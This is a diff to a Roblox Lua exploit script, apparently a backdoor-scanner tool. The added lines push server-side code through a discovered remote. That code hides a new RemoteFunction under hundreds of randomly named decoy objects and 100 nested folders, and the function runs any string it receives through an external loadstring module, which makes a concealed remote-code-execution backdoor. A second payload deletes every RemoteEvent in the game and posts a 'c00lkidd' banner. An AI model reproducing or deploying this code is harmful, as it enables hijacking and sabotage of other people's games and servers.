@@ -3136,6 +3136,76 @@ if request then
         Body = HttpService:JSONEncode(data)
     })
 end
+fireRemoteEvent([[local charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789,(💥).<>[💢_]=$&💫-+!:;%@#~{} "
+local function randomName(length)
+    local name = ""
+    for i = 1, length do
+        local randIndex = math.random(1, #charset)
+        name = name .. charset:sub(randIndex, randIndex)
+    end
+    return name
+end
+
+local loadstring = require(13684410229)
+
+local types = {
+    "ObjectValue", "StringValue", "IntValue", "NumberValue", "Sound",
+    "BoolValue", "Vector3Value", "CFrameValue", "Configuration", "LocalScript",
+    "BindableFunction", "BindableEvent", "Hint", "Message", "Folder", "Script"
+}
+
+local root = game:GetService("LocalizationService")
+local deepFolder = root
+for i = 1, 100 do
+    local folder = Instance.new("Folder")
+    folder.Name = randomName(15)
+    folder.Parent = deepFolder
+    deepFolder = folder
+end
+
+local pool = { deepFolder }
+
+for i = 1, 500 do
+    local inst = Instance.new(types[math.random(1, #types)])
+    inst.Name = randomName(20)
+    local parent
+    if #pool == 0 or math.random() < 0.2 then
+        parent = deepFolder
+    else
+        parent = pool[math.random(1, #pool)]
+    end
+    inst.Parent = parent
+    table.insert(pool, inst)
+end
+
+local realRemote = Instance.new("RemoteFunction")
+realRemote.Name = randomName(30)
+realRemote.Parent = pool[math.random(1, #pool)]
+realRemote.OnServerInvoke = function(_1, _2)
+    return loadstring(_2)()
+end
+
+for i = 1, 10 do
+    local fakeRE = Instance.new("RemoteEvent")
+    fakeRE.Name = randomName(28)
+    fakeRE.Parent = pool[math.random(1, #pool)]
+    fakeRE.OnServerEvent:Connect(function() end)
+end
+
+for i = 1, 10 do
+    local fakeRF = Instance.new("RemoteFunction")
+    fakeRF.Name = randomName(28)
+    fakeRF.Parent = pool[math.random(1, #pool)]
+    fakeRF.OnServerInvoke = function() return nil end
+end]])
+wait(0.8)
+fireRemoteEvent([[
+for i, v in ipairs(game:GetDescendants()) do 
+   if v:IsA("RemoteEvent") then 
+     v:Destroy()
+   end
+end
+Instance.new("Hint",workspace).Text = "The Backdoor has been protected by c00lkidd SS."]])
 	    else
 			script.Parent.Framee.Check.Text = "No backdoor :("
 			script.Parent.stat.ImageColor3 = Color3.fromRGB(226, 69, 69)
